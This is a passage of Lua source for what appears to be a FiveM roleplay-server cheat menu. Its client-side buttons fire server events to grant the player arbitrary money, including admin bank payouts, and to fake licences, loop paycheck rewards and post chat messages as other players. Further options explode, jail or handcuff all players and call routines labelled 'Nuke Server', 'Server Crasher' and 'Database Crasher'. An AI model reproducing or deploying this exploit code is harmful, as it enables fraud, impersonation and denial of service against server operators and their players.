              elseif LR.Button("~g~ESX ~y~Pizza Boy") then
                local result = KeyboardInput("Enter amount of money", "", 100)
                if result ~= "" then
                  TSE("esx_pizza:pay", result)
                end
              elseif LR.Button("~g~ESX ~y~Ranger Job") then
                local result = KeyboardInput("Enter amount of money", "", 100)
                if result ~= "" then
                  TSE("esx_ranger:pay", result)
                end
              elseif LR.Button("~g~ESX ~y~Garbage Job") then
                local result = KeyboardInput("Enter amount of money", "", 100)
                if result ~= "" then
                  TSE("esx_garbagejob:pay", result)
                end
              elseif LR.Button("~g~ESX ~y~Car Thief ~r~DIRTY MONEY") then
                local result = KeyboardInput("Enter amount of dirty money", "", 100)
                if result ~= "" then
                  TSE("esx_carthief:pay", result)
                end
              elseif LR.Button("~g~ESX ~y~Trucker Job") then
                local result = KeyboardInput("Enter amount of money", "", 100)
                if result ~= "" then
                  TSE("esx_truckerjob:pay", result)
                end
              elseif LR.Button("~g~ESX ~y~Admin Give Bank") then
                local result = KeyboardInput("Enter amount of money", "", 100)
                if result ~= "" then
                  TSE("AdminMenu:giveBank", result)
                end
              elseif LR.Button("~g~ESX ~y~Admin Give Cash") then
                local result = KeyboardInput("Enter amount of money", "", 100)
                if result ~= "" then
                  TSE("AdminMenu:giveCash", result)
                end
              elseif LR.Button("~g~ESX ~y~Postal Job") then
                local result = KeyboardInput("Enter amount of money", "", 100)
                if result ~= "" then
                  TSE("esx_gopostaljob:pay", result)
                end
              elseif LR.Button("~g~ESX ~y~Banker Job") then
                local result = KeyboardInput("Enter amount of money", "", 100)
                if result ~= "" then
                  TSE("esx_banksecurity:pay", result)
                end
              elseif LR.Button("~g~ESX ~y~Slot Machine") then
                local result = KeyboardInput("Enter amount of money", "", 100)
                if result ~= "" then
                  TSE("esx_slotmachine:sv:2", result)
                end
              end
			  
			 LR.Display()
            elseif LR.IsMenuOpened(SEVR) then
              drawDescription("xAries Menu", 0.46, 0.46)
              if LR.MenuButton("~p~#~s~ ~w~PL ~s~Money", MoneyP) then
              elseif LR.MenuButton("~p~#~s~ ~w~Troll Opcje", TrollP) then
              end
--=========================================Pieniadze==============================================				  
			 LR.Display()
            elseif LR.IsMenuOpened(MoneyP) then
              drawDescription("Menu Pieniedzy", 0.46, 0.46)
              if LR.MenuButton("~p~#~s~ ~w~AvizonRP", AvizonRPM) then
              elseif LR.MenuButton("~p~#~s~ ~w~MoroRP", MoroRPM) then
              end
			  
			 LR.Display()
            elseif LR.IsMenuOpened(AvizonRPM) then
              drawDescription("AvizonRP", 0.46, 0.46)
              if LR.MenuButton("~p~#~s~ ~w~Sposob 1") then
			  print("XDDD")
              elseif LR.MenuButton("~p~#~s~ ~w~Sposob 2") then
			  print("XDDD")
              end
			 
			 LR.Display()
            elseif LR.IsMenuOpened(MoroRPM) then
              drawDescription("Menu Pieniedzy", 0.46, 0.46)
              if LR.MenuButton("~p~#~s~ ~w~Sposob 1") then
			  print("XDDD")
              elseif LR.MenuButton("~p~#~s~ ~w~Sposob 2") then
			  print("XDDD")
              end
			  
			 

--=========================================TROLLOWANIE==============================================			  
			 LR.Display()
            elseif LR.IsMenuOpened(TrollP) then
              drawDescription("Menu Trollowania", 0.46, 0.46)
              if LR.MenuButton("~p~#~s~ ~w~AvizonRP", AvizonRPT) then
              elseif LR.MenuButton("~p~#~s~ ~w~MoroRP", MoroRPT) then
              end
			  
			 LR.Display()
            elseif LR.IsMenuOpened(AvizonRPT) then
              drawDescription("Menu Pieniedzy", 0.46, 0.46)
              if LR.MenuButton("~p~#~s~ ~w~Sposob 1") then
              elseif LR.MenuButton("~p~#~s~ ~w~Sposob 2") then
              end
			 
			 LR.Display()
            elseif LR.IsMenuOpened(MoroRPT) then
              drawDescription("Menu Pieniedzy", 0.46, 0.46)
              if LR.MenuButton("~p~#~s~ ~w~Sposob 1") then
              elseif LR.MenuButton("~p~#~s~ ~w~Sposob 2") then
              end
			 
			 
			 
--===================================================================================================			  
            elseif LR.IsMenuOpened(ESXC) then
              drawDescription("ESX Triggers for thirst/hunger/dmv etc", 0.42, 0.42)
              if LR.Button("~w~Set hunger to ~g~100") then
                TriggerEvent("esx_status:set", "hunger", 1000000)
              elseif LR.Button("~w~Set thirst to ~g~100") then
                TriggerEvent("esx_status:set", "thirst", 1000000)
              elseif LR.Button("Get Driving License") then
                TSE("esx_dmvschool:addLicense", 'dmv')
                TSE("esx_dmvschool:addLicense", 'drive')
              elseif LR.Button("~b~Buy ~s~a vehicle for ~g~free") then
                matacumparamasini()
              end


              LR.Display()
            elseif LR.IsMenuOpened(ESXD) then
              drawDescription("ESX Triggers for drugs", 0.58, 0.58)
              if LR.Button("~g~Harvest ~g~Weed") then
                hweed()
              elseif LR.Button("~g~Transform ~g~Weed") then
                tweed()
              elseif LR.Button("~g~Sell ~g~Weed") then
                sweed()
              elseif LR.Button("~w~Harvest ~w~Coke") then
                hcoke()
              elseif LR.Button("~w~Transform ~w~Coke") then
                tcoke()
              elseif LR.Button("~w~Sell ~w~Coke") then
                scoke()
              elseif LR.Button("~r~Harvest Meth") then
                hmeth()
              elseif LR.Button("~r~Transform Meth") then
                tmeth()
              elseif LR.Button("~r~Sell Meth") then
                smeth()
              elseif LR.Button("~p~Harvest Opium") then
                hopi()
              elseif LR.Button("~p~Transform Opium") then
                topi()
              elseif LR.Button("~p~Sell Opium") then
                sopi()
              elseif LR.Button("~g~Money Wash") then
                mataaspalarufe()
              elseif LR.Button("~r~Stop all") then
                matanumaispalarufe()
              elseif LR.CheckBox("~r~Blow Drugs Up ~y~DANGER!",BlowDrugsUp,function(enabled)BlowDrugsUp = enabled end) then
              end


              LR.Display()
            elseif LR.IsMenuOpened(VRPT) then
              drawDescription("Basic VRP Triggers", 0.42, 0.42)
              if LR.Button("~r~VRP ~s~Give Money ~ypayGarage") then
                local result = KeyboardInput("Enter amount of money", "", 100)
                if result ~= "" then
                  TSE("lscustoms:payGarage", {costs = -result})
                end
              elseif LR.Button("~r~VRP ~g~PayCheck Abuse") then
                local v = KeyboardInput("How many times?", "", 100)
                if v ~= "" then
                  for i = 0,v do
                    TSE('paychecks:bonus')
                    TSE('paycheck:bonus')
                  end
                else
                  notify("~b~Invalid amount~s~.", false)
                end
              elseif LR.Button("~r~VRP ~g~SalaryPay Abuse","You need a job!") then
                local v = KeyboardInput("How many times?", "", 100)
                if v ~= "" then
                  for i = 0,v do
                    TSE('paychecks:salary')
                    TSE('paycheck:salary')
                  end
                else
                  notify("~b~Invalid amount~s~.", false)
                end
              elseif LR.Button("~r~VRP ~g~WIN ~s~Slot Machine") then
                local result = KeyboardInput("Enter amount of money", "", 100)
                if result ~= "" then
                  TSE("vrp_slotmachine:server:2",result)
                end
              elseif LR.Button("~r~VRP ~s~Get driving license") then
                TSE("dmv:success")
              elseif LR.Button("~r~VRP ~s~Bank Deposit") then
                local result = KeyboardInput("Enter amount of money", "", 100)
                if result ~= "" then
                  TSE("Banca:deposit", result)
                  TSE("bank:deposit", result)
                end
              elseif LR.Button("~r~VRP ~s~Bank Withdraw ") then
                local result = KeyboardInput("Enter amount of money", "", 100)
                if result ~= "" then
                  TSE("bank:withdraw", result)
                  TSE("Banca:withdraw", result)
                end
              end

              LR.Display()
            elseif LR.IsMenuOpened(MSTC) then
              drawDescription("Fun triggers to play with", 0.30, 0.30)
              if LR.Button("Send Fake Message") then
                local pname = KeyboardInput("Enter player name", "", 100)
                if pname then
                  local message = KeyboardInput("Enter message", "", 1000)
                  if message then
                    TSE("_chat:messageEntered", pname, { 0, 0x99, 255 }, message)
                  end
                end
              end

              LR.Display()
            elseif LR.IsMenuOpened(advm) then
              if LR.MenuButton("~p~#~s~ Destroyer Menu", dddd) then
              elseif LR.MenuButton("~p~#~s~ ESP Menu", espa) then
              elseif LR.CheckBox("Player Blips", bBlips, function(bBlips) end) then
                showblip = not showblip
                bBlips = showblip
              elseif LR.CheckBox("Name Above Players n Indicator", nameabove, function(enabled) nameabove = enabled end) then
			  elseif LR.CheckBox("~y~Jesus~s~Mode", dio, function(enabled) dio = enabled end) then
              elseif LR.ComboBox("~y~Jesus~s~Mode Radius", JesusRadiusOps, currJesusRadiusIndex, selJesusRadiusIndex, function(currentIndex, selectedIndex)
                currJesusRadiusIndex = currentIndex
                selJesusRadiusIndex = currentIndex
                JesusRadius = JesusRadiusOps[currentIndex]
				end) then
                elseif LR.CheckBox("Magnet ~r~Boy", magnet, function(enabled) MagnetoBoy() end) then
                end

                LR.Display()
              elseif LR.IsMenuOpened(CMSMS) then
                drawDescription("Crosshairs modifications", 0.29, 0.29)
                if LR.CheckBox("~y~Original ~s~Crosshair", crosshair, function (enabled) crosshair = enabled crosshairc = false crosshairc2 = false end) then
                elseif LR.CheckBox("~r~CROSS ~s~Crosshair", crosshairc, function (enabled) crosshair = false crosshairc = enabled crosshairc2 = false end) then
                elseif LR.CheckBox("~r~DOT ~s~Crosshair", crosshairc2, function (enabled) crosshair = false crosshairc = false crosshairc2 = enabled end) then
                end

                LR.Display()
			  elseif LR.IsMenuOpened(GAPA) then
                if LR.Button("~r~Jailuj~s~ WSZYSTKICH v 0.1") then
                  jailall()
                elseif LR.Button("~r~Banana ~p~Party~s~ All players") then
                  bananapartyall()
                elseif LR.Button("~r~Cage~s~ All players") then
                  cageall()
                elseif LR.Button("~r~BORGAR~s~ All players") then
                  borgarall()
                elseif LR.Button("~r~Explode~s~ All players") then
                  explodeall()
                elseif LR.Button("~r~Give Weapons to~s~ All players") then
                weaponsall()
                elseif LR.CheckBox( "~r~Handcuff~s~ All players", freezeall, function(enabled) freezeall = enabled end) then
				        elseif LR.CheckBox( "~r~Disable~s~ All Cars", cardz, function(enabled) cardz = enabled end) then
				        elseif LR.CheckBox( "~r~Disable~s~ All Guns", gundz, function(enabled) gundz = enabled end) then
                end

                LR.Display()
              elseif LR.IsMenuOpened(dddd) then
                if LR.Button("~r~Nuke ~s~Server") then
                  nukeserver()
                elseif LR.CheckBox( "~r~Silent ~s~Server ~y~Crasher", servercrasherxd, function(enabled) servercrasherxd = enabled end) then
                elseif LR.Button("~g~ESX ~r~Destroy ~r~v3") then
				  	esxdestroyv3()
                elseif LR.Button("~g~VRP ~r~Destroy ~r~V1") then
					vrpdestroy()
				elseif LR.CheckBox( "~g~VRP ~r~Database Crasher", vrpdbc, function(enabled) vrpdbc = enabled end) then
        elseif LR.CheckBox( "~g~GCPhone ~r~Destroy", gcphonedestroy, function(enabled) gcphonedestroy = enabled end) then
        elseif LR.Button("~r~Rampinator LOL") then
          for vehicle in EnumerateVehicles() do
            local ramp = CreateObject(-145066854, 0, 0, 0, true, true, true)
            NetworkRequestControlOfEntity(vehicle)
            AttachEntityToEntity(ramp, vehicle, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
            NetworkRequestControlOfEntity(ramp)
            SetEntityAsMissionEntity(ramp, true, true)
          end
				end

                LR.Display()
              elseif LR.IsMenuOpened(crds) then
                drawDescription(";)", 0.29, 0.29)
                if LR.Button("~p~#~s~ nit34byte~r~#~r~1337"," ~p~DEV") then
                end

                LR.Display()
              elseif LR.IsMenuOpened(WTNe) then
                drawDescription("Weapon list to give yourself", 0.58, 0.58)
                for k, v in pairs(l_weapons) do
                  if LR.MenuButton("~p~#~s~ "..k, WTSbull) then
                    WeaponTypeSelect = v
                  end
                end
                LR.Display()
              elseif LR.IsMenuOpened(WTSbull) then
                for k, v in pairs(WeaponTypeSelect) do
                  if LR.MenuButton(v.name, WOP) then
                    WeaponSelected = v
                  end
                end
                LR.Display()
              elseif LR.IsMenuOpened(WOP) then
                if LR.Button("~r~Spawn Weapon") then
                  GiveWeaponToPed(GetPlayerPed(-1), GetHashKey(WeaponSelected.id), 1000, false)
                end
                if LR.Button("~g~Add Ammo") then
                  SetPedAmmo(GetPlayerPed(-1), GetHashKey(WeaponSelected.id), 5000)
                end
                if LR.CheckBox("~r~Infinite ~s~Ammo", WeaponSelected.bInfAmmo, function(s)
                end) then
                  WeaponSelected.bInfAmmo = not WeaponSelected.bInfAmmo
                  SetPedInfiniteAmmo(GetPlayerPed(-1), WeaponSelected.bInfAmmo, GetHashKey(WeaponSelected.id))
                  SetPedInfiniteAmmoClip(GetPlayerPed(-1), true)
                  PedSkipNextReloading(GetPlayerPed(-1))
                  SetPedShootRate(GetPlayerPed(-1), 1000)
                end
                for k, v in pairs(WeaponSelected.mods) do
                  if LR.MenuButton("~p~#~s~ ~r~> ~s~"..k, MSMSA) then
                    ModSelected = v
                  end
                end
                LR.Display()
              elseif LR.IsMenuOpened(MSMSA) then
                for _, v in pairs(ModSelected) do
                  if LR.Button(v.name) then
                    GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey(WeaponSelected.id), GetHashKey(v.id));
                  end
                end

                LR.Display()
              elseif LR.IsMenuOpened(CTSa) then
                drawDescription("Spawn a car in front of you", 0.58, 0.58)
                for i, aName in ipairs(CarTypes) do
                  if LR.MenuButton("~p~#~s~ "..aName, CTS) then
                    carTypeIdx = i
                  end
                end
                LR.Display()
              elseif LR.IsMenuOpened(CTS) then
                for i, aName in ipairs(CarsArray[carTypeIdx]) do
                  if LR.MenuButton("~p~#~s~ ~r~>~s~ "..aName, cAoP) then
                    carToSpawn = i
                  end
                end
                LR.Display()
              elseif LR.IsMenuOpened(cAoP) then
                if LR.CheckBox("~g~Spawn inside", spawninside, function(enabled) spawninside = enabled end) then
                elseif LR.Button("~r~Spawn Car") then
                  local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
                  local veh = CarsArray[carTypeIdx][carToSpawn]
                  if veh == nil then
                    veh = "adder"
                  end
                  vehiclehash = GetHashKey(veh)
                  RequestModel(vehiclehash)

                  Citizen.CreateThread(function()
                  local waiting = 0
                  while not HasModelLoaded(vehiclehash) do
                    waiting = waiting + 100
                    Citizen.Wait(100)
                    if waiting > 5000 then
                      ShowNotification("~r~Cannot spawn this vehicle.")
                      break
                    end
                  end
                  SpawnedCar = CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1))+90, 1, 0)
                  SetVehicleStrong(SpawnedCar, true)
                  SetVehicleEngineOn(SpawnedCar, true, true, false)
                  SetVehicleEngineCanDegrade(SpawnedCar, false)
                  if spawninside then
                    SetPedIntoVehicle(PlayerPedId(-1), SpawnedCar, -1)
                  end
                  end)
                end

                LR.Display()
              elseif LR.IsMenuOpened(MTS) then
                drawDescription("Be in a car/truck, then spawn any trailer", 0.58, 0.58)
                if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                  for i, aName in ipairs(Trailers) do
                    if LR.MenuButton("~p~#~s~ ~r~>~s~ "..aName, CTSmtsps) then
                      TrailerToSpawn = i
                    end
                  end
                else
                  notify("~w~Not in a vehicle", true)
                end
                LR.Display()
              elseif LR.IsMenuOpened(CTSmtsps) then
                if LR.Button("~r~Spawn Car") then
                  local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
                  local veh = Trailers[TrailerToSpawn]
                  if veh == nil then veh = "adder" end
                  vehiclehash = GetHashKey(veh)
                  RequestModel(vehiclehash)

                  Citizen.CreateThread(function()
                  local waiting = 0
                  while not HasModelLoaded(vehiclehash) do
                    waiting = waiting + 100
                    Citizen.Wait(100)
                    if waiting > 5000 then
                      ShowNotification("~r~Cannot spawn this vehicle.")
                      break
                    end
                  end
                  local SpawnedCar = CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1))+90, 1, 0)
                  local UserCar = GetVehiclePedIsUsing(GetPlayerPed(-1))
                  AttachVehicleToTrailer(Usercar, SpawnedCar, 50.0)
                  SetVehicleStrong(SpawnedCar, true)
                  SetVehicleEngineOn(SpawnedCar, true, true, false)
                  SetVehicleEngineCanDegrade(SpawnedCar, false)
                  end)
                end

                LR.Display()
              elseif LR.IsMenuOpened(GSWP) then
                drawDescription("Weapon list to give to the player", 0.58, 0.58)
                for i = 1, #allWeapons do
                  if LR.Button(allWeapons[i]) then
                    GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, true)
                  end
                end

                LR.Display()
              elseif LR.IsMenuOpened(espa) then
                drawDescription("Extra Sensory Perception menu", 0.34, 0.34)
                if LR.CheckBox("~r~ESP ~s~MasterSwitch", esp, function(enabled) esp = enabled end) then
                elseif LR.CheckBox("~r~ESP ~s~Box", espbox, function(enabled) espbox = enabled end) then
                elseif LR.CheckBox("~r~ESP ~s~Info", espinfo, function(enabled) espinfo = enabled end) then
                elseif LR.CheckBox("~r~ESP ~s~Lines", esplines, function(enabled) esplines = enabled end) then
                end

                LR.Display()
              elseif LR.IsMenuOpened(LSCC) then
                drawDescription("Apply some cool stuff to your car", 0.46, 0.46)
                local veh = GetVehiclePedIsUsing(PlayerPedId())
                if LR.MenuButton("~p~#~s~ ~r~Exterior ~s~Tuning", tngns) then
                elseif LR.MenuButton("~p~#~s~ ~r~Performance ~s~Tuning", prof) then
                elseif LR.Button("Change Car License Plate") then
                  carlicenseplaterino()
                elseif LR.CheckBox("~g~R~r~a~y~i~b~n~o~b~r~o~g~w ~s~Vehicle Colour", RainbowVeh, function(enabled) RainbowVeh = enabled end) then
                elseif LR.Button("Make vehicle ~y~dirty") then
                  Clean(GetVehiclePedIsUsing(PlayerPedId(-1)))
                elseif LR.Button("Make vehicle ~g~clean") then
                  Clean2(GetVehiclePedIsUsing(PlayerPedId(-1)))
                elseif LR.CheckBox("~g~R~r~a~y~i~b~n~o~b~r~o~g~w ~s~Neons & Headlights", rainbowh, function(enabled) rainbowh = enabled end) then
                end


                LR.Display()
              elseif LR.IsMenuOpened(bmm) then
                drawDescription("Give your car nitro", 0.46, 0.46)
                if LR.ComboBox("Engine ~r~Power ~s~Booster", powerboost, currentItemIndex, selectedItemIndex, function(currentIndex, selectedIndex)
                currentItemIndex = currentIndex
                selectedItemIndex = selectedIndex
                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), selectedItemIndex * 20.0)
                end) then

                elseif LR.CheckBox("Engine ~g~Torque ~s~Booster ~g~2x", t2x, function(enabled)
                  t2x = enabled
                  t4x = false
                  t10x = false
                  t16x = false
                  txd = false
                  tbxd = false
                  end) then
                  elseif LR.CheckBox("Engine ~g~Torque ~s~Booster ~g~4x", t4x, function(enabled)
                    t2x = false
                    t4x = enabled
                    t10x = false
                    t16x = false
                    txd = false
                    tbxd = false
                    end) then
                    elseif LR.CheckBox("Engine ~g~Torque ~s~Booster ~g~10x", t10x, function(enabled)
                      t2x = false
                      t4x = false
                      t10x = enabled
                      t16x = false
                      txd = false
                      tbxd = false
                      end) then
                      elseif LR.CheckBox("Engine ~g~Torque ~s~Booster ~g~16x", t16x, function(enabled)
                        t2x = false
                        t4x = false
                        t10x = false
                        t16x = enabled
                        txd = false
                        tbxd = false
                        end) then
                        elseif LR.CheckBox("Engine ~g~Torque ~s~Booster ~y~XD", txd, function(enabled)
                          t2x = false
                          t4x = false
                          t10x = false
                          t16x = false
                          txd = enabled
                          tbxd = false
                          end) then
                          elseif LR.CheckBox("Engine ~g~Torque ~s~Booster ~y~BIG XD", tbxd, function(enabled)
                            t2x = false
                            t4x = false
                            t10x = false
                            t16x = false
                            txd = false
                            tbxd = enabled
                            end) then

                            end
                            LR.Display()
                          end
                          Citizen.Wait(0)
                        end
                        end)